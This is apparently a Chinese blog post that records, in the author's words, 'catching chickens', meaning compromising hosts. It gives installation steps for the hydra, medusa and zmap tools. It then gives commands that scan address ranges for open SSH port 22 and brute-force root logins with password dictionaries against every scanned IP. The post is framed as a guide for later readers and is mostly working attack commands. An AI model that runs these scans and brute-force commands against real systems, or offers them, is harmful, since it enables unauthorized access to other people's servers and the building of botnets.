title: zj尝试
author: 7h4mid4
tags:
  - 渗透
  - 抓鸡
categories:
  - 渗透
date: 2019-08-19 23:09:00
---
记录一下的抓鸡的经历，以供后来者学习。


sshcracker
https://github.com/yijingping/sshcracker

教程:

https://cloud.tencent.com/developer/article/1043710
https://www.freebuf.com/sectool/170779.html
https://www.freebuf.com/sectool/159488.html
https://www.cnblogs.com/bonelee/p/9322684.html

## 安装工具

### 安装hydra爆破工具

#### Centos的安装方式

```

wget https://github.com/vanhauser-thc/thc-hydra/archive/master.zip

yum -y install gcc libssh-devel openssl-devel

yum install -y unzip zip

unzip master.zip

cd thc-hydra-master/

./configure

make &&make install

```

#### Ubuntu的安装方式

```

sudo apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird-dev  hydra
//本人魔改，缺少libncp-dev

```

#### Windows的安装方式

https://github.com/maaaaz/thc-hydra-windows
下载解压安装即可。


### 安装`medusa`爆破工具

```
apt install medusa
或者手动编译安装。

```

apt安装之后，显示缺少ssh模块；手动编译安装之后显示安装在tools中，有ssh模块但是不能使用。

我的办法是：
将/tools/medusa/lib/medusa/modules/完整覆盖到/usr/lib/medusa/modules/中，然后进入/tools/medusa/bin/中使用./medusa的命令进行操作

### 安装zmap全网扫描工具

ubuntu直接使用apt安装

```
apt install zmap
```

sshcracker
https://github.com/yijingping/sshcracker

教程:

https://cloud.tencent.com/developer/article/1043710
https://www.freebuf.com/sectool/170779.html
https://www.freebuf.com/sectool/159488.html

## 操作

#### zmap扫描获取22开放的ip

```
zmap -r 2000 -p 22 192.168.0.0/16 -o iplist.txt
//以2000包每秒的速度探测22端口，将结果输出到iplist.txt文件中
```

#### medusa爆破

```
./medusa -M ssh -H iplist.txt -U users.txt -p password -O ssh.log
//指定ip文件，指定用户名字典，指定密码为password，结果输出到ssh.log文件中。

./medusa -M ssh -h 192.168.157.131 -u root -P newpass.txt
//指定ip为192.168.157.131，指定用户名为root，指定密码字典文件为newpass.txt

./medusa -M ssh -H iplist.txt -u root -P password-100.txt -O ssh.log

```
